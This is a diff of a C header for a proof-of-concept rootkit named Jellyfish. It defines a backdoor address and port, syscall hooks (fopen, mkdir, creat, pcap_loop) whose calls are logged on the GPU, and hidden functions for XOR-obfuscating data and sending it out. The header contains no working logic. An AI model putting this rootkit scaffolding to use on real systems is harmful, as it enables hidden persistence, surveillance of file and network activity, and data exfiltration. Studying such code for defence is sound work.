@@ -1,67 +1,34 @@
-/*
- 
-Copyright (C) 2015  Team Jellyfish
- 
-This program is free software; you can redistribute it and/or
-modify it under the terms of the GNU General Public License
-as published by the Free Software Foundation; either version 2
-of the License, or (at your option) any later version.
- 
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
- 
-*/
-
+#define _GNU_SOURCE
 #ifndef __KIT_H__
 #define __KIT_H__
 
+#include <CL/cl.h>
+
 #define __JELLYFISH__ "kit.cl"
 #define __JELLYXOR__ "xor.cl"
-#define VRAM_LIMIT 1497965  /* 10mb divided by 7 gpu kernels */
 
-/* Change this */
-#define ADDRESS "1.1.1.1"
-/* ---------- */
-
+#define VRAM_LIMIT 3495253  // 10mb divided by 3 gpu kernels
+#define ADDRESS "1.1.1.1"  // change this
 #define PORT 8771  // sample backdoor port for PoC
 
 // gpu functions
 #define log_fopen "log_fopen"
 #define log_mkdir "log_mkdir"
-#define log_lstat "log_lstat"
-#define log_lstat64 "log_lstat64"
 #define log_creat "log_creat"
-#define log_execve "log_execve"
-#define log_open "log_open"
+#define jelly_xor "jelly_xor"
 
 // syscalls
 #define SYS_FOPEN 0
 #define SYS_MKDIR 1
-#define SYS_LSTAT 2
-#define SYS_LSTAT64 3
-#define SYS_CREAT 4
-#define SYS_EXECVE 5
-#define SYS_OPEN 6
-#define SYS_PCAP_LOOP 7
-#define SYSCALL_SIZE 8
+#define SYS_CREAT 2
+#define SYS_PCAP_LOOP 3
+#define SYSCALL_SIZE 4
 
-typedef struct sys_calls{
+typedef struct syscall_struct{
     void *(*syscall_func)();
 } s_calls;
 
-s_calls syscall[SYSCALL_SIZE];
-
-const char *syscall_table[SYSCALL_SIZE];
-syscall_table[0] = "fopen";
-syscall_table[1] = "mkdir";
-syscall_table[2] = "lstat";
-syscall_table[3] = "lstat64";
-syscall_table[4] = "creat";
-syscall_table[5] = "execve";
-syscall_table[6] = "open";
-syscall_table[7] = "pcap_loop";
+s_calls syscalls[SYSCALL_SIZE];
 
 // hidden gpu functions
 cl_device_id create_device(void) __attribute__((visibility("hidden")));
@@ -72,6 +39,5 @@ cl_context create_ctx(const cl_device_id *dev) __attribute__((visibility("hidden
 void jelly_init(void) __attribute__((visibility("hidden")));
 static void limit_buf(char *buffer) __attribute__((visibility("hidden")));
 static void send_data(char *buffer) __attribute__((visibility("hidden")));
-static char *xor_data(char *buf) __attribute__((visibility("hidden")));
 
 #endif
